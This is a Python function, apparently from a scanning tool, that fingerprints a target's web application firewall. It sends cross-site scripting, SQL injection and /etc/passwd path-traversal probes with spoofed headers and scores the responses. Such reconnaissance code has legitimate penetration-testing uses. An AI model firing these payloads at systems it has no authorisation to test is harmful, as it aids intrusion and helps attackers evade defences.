async def detect_waf(client: httpx.AsyncClient, url: str) -> Dict[str, Any]:
    """
    Detect WAF by sending a malicious payload and analyzing the response.
    Returns: {"detected": bool, "waf_name": str|None, "confidence": str}
    """
    test_payloads = [
        "<script>alert(1)</script>",
        "' OR 1=1 --",
        "../../../etc/passwd",
    ]
    
    waf_scores: Dict[str, int] = {}
    
    for payload in test_payloads:
        try:
            test_url = f"{url}?waftest={quote(payload)}"
            hdrs = get_spoofed_headers()
            resp = await client.get(test_url, headers=hdrs, follow_redirects=True,
                                     timeout=httpx.Timeout(10.0))
            
            resp_headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            resp_body_lower = resp.text.lower()
            
            for waf_name, sigs in WAF_SIGNATURES.items():
                score = 0
                # Check headers
                for h in sigs["headers"]:
                    if h.lower() in resp_headers_lower:
                        score += 2
                # Check body
                for b in sigs["body"]:
                    if b.lower() in resp_body_lower:
                        score += 3
                # Check status code
                if resp.status_code in sigs["status_codes"]:
                    score += 1
                    
                if score > 0:
                    waf_scores[waf_name] = waf_scores.get(waf_name, 0) + score
                    
        except Exception:
            continue
    
    if waf_scores:
        best_waf = max(waf_scores, key=waf_scores.get)
        confidence = "HIGH" if waf_scores[best_waf] >= 5 else "MEDIUM" if waf_scores[best_waf] >= 3 else "LOW"
        return {"detected": True, "waf_name": best_waf, "confidence": confidence}
    
    return {"detected": False, "waf_name": None, "confidence": None}


